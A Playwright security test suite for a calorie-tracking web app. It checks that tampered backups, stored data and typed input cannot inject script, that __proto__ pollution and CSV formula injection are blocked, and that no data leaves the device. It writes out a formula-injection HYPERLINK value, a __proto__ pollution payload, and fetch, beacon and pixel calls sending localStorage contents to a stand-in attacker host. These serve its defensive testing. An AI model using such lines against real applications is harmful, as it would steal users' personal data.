// Dynamic security tests. Title format "SEC-1xx [severity] Title" feeds the security report.
const { test } = require('@playwright/test');
const fs = require('fs');
const { openApp, tab, openBackup, pwned, payload: P, renderEverything, todayKey, expect } = require('./harness');

const meta = (o) => Object.entries(o).forEach(([type, description]) => test.info().annotations.push({ type, description }));

function hostileBackup() {
  const k = todayKey();
  return {
    _version: 1, _app: 'calorie-meter', _exported: new Date().toISOString(),
    data: {
      settings: { k: P('settings.k'), p: P('settings.p'), c: 245, f: 63, water: P('settings.water'), sets: P('settings.sets') },
      days: { [k]: [{ n: P('entry.name'), u: P('entry.unit'), qty: P('entry.qty'), meal: 'Lunch', p: 1, c: 1, f: 1, k: 10 },
                    { n: 'Tofu', u: 'g', qty: 100, meal: 'Lunch', p: 1, c: 1, f: 1, k: 10 }] },
      custom: [{ n: P('custom.name'), u: P('custom.unit'), q: P('custom.qty'), p: 1, c: 1, f: 1, k: 1, t: P('custom.type') }],
      recent: [{ n: P('recent.name'), u: P('recent.unit'), qty: P('recent.qty') }],
      water: { [k]: P('water') },
      profile: { w: P('profile.w'), sex: P('profile.sex'), act: P('profile.act'), goal: P('profile.goal') },
    },
  };
}

test('SEC-101 [high] A tampered backup file cannot run code in the app', async ({ context }) => {
  meta({ owasp: 'A03 Injection (stored XSS); A08 Software & Data Integrity Failures', iso: 'A.8.28 Secure coding; A.8.26 Application security requirements',
    why: 'Restoring a crafted backup (e.g. one shared by someone else, or altered in cloud storage) runs attacker code with full access to all app data — and to other apps hosted on the same github.io address.',
    fix: 'Validate and clean every field when restoring (numbers must be numbers, text must be plain text) and escape every stored value before it is shown.' });
  const page = await openApp(context);
  await openBackup(page);
  await page.locator('#restorefile').setInputFiles({ name: 'backup.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(hostileBackup())) });
  await page.waitForTimeout(300);
  // The file is well-formed, so the app should accept it — the point is that it must be made harmless.
  await expect(page.locator('#confirmrestore'), 'a well-formed backup should still be restorable').toBeVisible();
  await page.locator('#confirmrestore').click();
  await page.waitForTimeout(400);
  await renderEverything(page);
  const ran = await pwned(page);
  expect(ran, `injected code ran from these backup fields: ${ran.join(', ')}`).toEqual([]);
});

test('SEC-107 [high] Tampered data already saved on the device cannot run code', async ({ context }) => {
  meta({ owasp: 'A03 Injection (stored XSS)', iso: 'A.8.28 Secure coding',
    why: 'Data saved in the browser can be altered by other code on the same github.io address; the app must not trust it blindly.',
    fix: 'Clean stored data when the app loads, and escape every value before it is shown.' });
  const page = await openApp(context, { storage: hostileBackup().data });
  await renderEverything(page);
  const ran = await pwned(page);
  expect(ran, `injected code ran from these saved fields: ${ran.join(', ')}`).toEqual([]);
});

test('SEC-102 [high] Text typed into "Add your own food" cannot run code', async ({ context }) => {
  meta({ owasp: 'A03 Injection (XSS)', iso: 'A.8.28 Secure coding', why: 'Food names are shown in several places; unescaped names would run as code.', fix: 'Escape the name everywhere it is displayed.' });
  const page = await openApp(context);
  await tab(page, 'set');
  await page.locator('#cn').fill(P('form.name')); await page.locator('#cq').fill('1');
  await page.locator('#cp').fill('1'); await page.locator('#cc').fill('1'); await page.locator('#cf').fill('1');
  await page.locator('#savec').click();
  await renderEverything(page);                    // shows it in lists, search and the quantity sheet
  await page.evaluate(() => addEntry(DB.custom[0], 1, 'Lunch')); // log it
  await page.reload();
  await renderEverything(page);                    // shows it in the meal log, recents and edit sheet
  expect(await pwned(page)).toEqual([]);
});

test('SEC-103 [medium] A malformed backup is rejected and cannot break or pollute the app', async ({ context }) => {
  meta({ owasp: 'A08 Software & Data Integrity Failures', iso: 'A.8.26 Application security requirements; A.8.13 Information backup',
    why: 'A corrupt or hostile backup should be refused, not accepted and left to crash the app or alter core JavaScript objects.',
    fix: 'Check the backup structure before offering to restore; ignore unknown and dangerous keys like __proto__.' });
  const page = await openApp(context);
  await tab(page, 'set');
  const bad = '{"_app":"calorie-meter","_exported":"2026-01-01","data":{"days":"not-an-object","custom":{"n":"x"},"__proto__":{"polluted":"yes"},"settings":{"__proto__":{"polluted":"yes"}}}}';
  await page.locator('#restorefile').setInputFiles({ name: 'bad.json', mimeType: 'application/json', buffer: Buffer.from(bad) });
  await page.waitForTimeout(300);
  const offered = await page.locator('#confirmrestore').isVisible();
  const errors = []; page.on('pageerror', e => errors.push(e.message));
  if (offered) { await page.locator('#confirmrestore').click(); await page.waitForTimeout(300); for (const v of ['home', 'today', 'set']) await tab(page, v).catch(() => {}); }
  const polluted = await page.evaluate(() => ({}).polluted);
  expect({ offeredToRestore: offered, crashed: errors.length > 0, polluted: polluted === 'yes' }, errors.join(' | ')).toEqual({ offeredToRestore: false, crashed: false, polluted: false });
});

test('SEC-104 [medium] CSV export cannot smuggle spreadsheet formulas', async ({ context }) => {
  meta({ owasp: 'A03 Injection (CSV / formula injection)', iso: 'A.8.28 Secure coding; A.8.12 Data leakage prevention',
    why: 'A value starting with = + - or @ is run as a formula when the CSV opens in Excel, which can leak data or trigger links.',
    fix: 'Prefix text cells that start with = + - @ (or tab/carriage return) with an apostrophe when exporting.' });
  const page = await openApp(context, { storage: { settings: { k: 2000, p: 150, c: 200, f: 60, water: 3000, sets: 20 }, custom: [],
    recent: [], days: { [todayKey()]: [{ n: '=HYPERLINK("https://example.invalid/?d="&A1,"click")', u: 'g', qty: 1, meal: 'Lunch', p: 1, c: 1, f: 1, k: 9 }] } } });
  await openBackup(page);
  const [dl] = await Promise.all([page.waitForEvent('download'), page.locator('#export').click()]);
  const csv = fs.readFileSync(await dl.path(), 'utf8');
  const cells = csv.split('\n').slice(1).flatMap(r => r.split('","').map(c => c.replace(/^"|"$/g, '')));
  const dangerous = cells.filter(c => /^[=+\-@\t\r]/.test(c) && !/^-?\d+(\.\d+)?$/.test(c));
  expect(dangerous, 'formula cells exported as-is').toEqual([]);
});

test('SEC-105 [high] Personal data never leaves the device', async ({ context }) => {
  meta({ owasp: 'A05 Security Misconfiguration', iso: 'A.5.34 Privacy and protection of PII; A.8.12 Data leakage prevention',
    why: 'The app promises everything stays on the device; any request carrying log data would break that promise.',
    fix: 'Remove the network call, or disclose it and get consent.' });
  const sent = [];
  context.on('request', r => { const u = new URL(r.url()); if (!/security\.local$/.test(u.host)) sent.push(r.method() + ' ' + u.host + u.pathname + (u.search ? ' (with query)' : '') + (r.postData() ? ' (with body)' : '')); });
  const page = await openApp(context);
  await tab(page, 'today');
  await page.locator('button.band-add[data-meal="Lunch"]').click();
  await page.locator('#q').fill('Tofu');
  await page.locator('#results button').first().click();
  await page.locator('#qv').fill('150'); await page.locator('#confirm').click();
  await openBackup(page);
  await Promise.all([page.waitForEvent('download'), page.locator('#backup').click()]);
  await Promise.all([page.waitForEvent('download'), page.locator('#export').click()]);
  const leaks = sent.filter(s => !/^GET fonts\.(googleapis|gstatic)\.com/.test(s) || /with body/.test(s));
  expect(leaks, 'requests to other servers').toEqual([]);
});

test('SEC-106 [medium] If code is ever injected, it cannot send data to another website', async ({ context }) => {
  meta({ owasp: 'A05 Security Misconfiguration (defence in depth)', iso: 'A.8.9 Configuration management; A.8.12 Data leakage prevention',
    why: 'A Content Security Policy is the safety net: even if an injection bug slips through, stolen data cannot be sent out.',
    fix: 'Add a Content Security Policy meta tag with connect-src \'none\' and img-src limited to self/data/blob.' });
  const page = await openApp(context);
  let exfil = 0;
  await context.route('https://attacker.invalid/**', r => { exfil++; r.fulfill({ body: '' }); });
  await page.evaluate(async () => {
    try { await fetch('https://attacker.invalid/steal?d=' + encodeURIComponent(localStorage.getItem('macrolog-v1') || 'x')); } catch (e) {}
    try { navigator.sendBeacon && navigator.sendBeacon('https://attacker.invalid/beacon', 'x'); } catch (e) {}
    await new Promise(res => { const i = new Image(); i.onload = i.onerror = res; i.src = 'https://attacker.invalid/pixel.gif'; setTimeout(res, 1500); });
  });
  await page.waitForTimeout(500);
  expect(exfil, 'requests reached the attacker server').toBe(0);
});
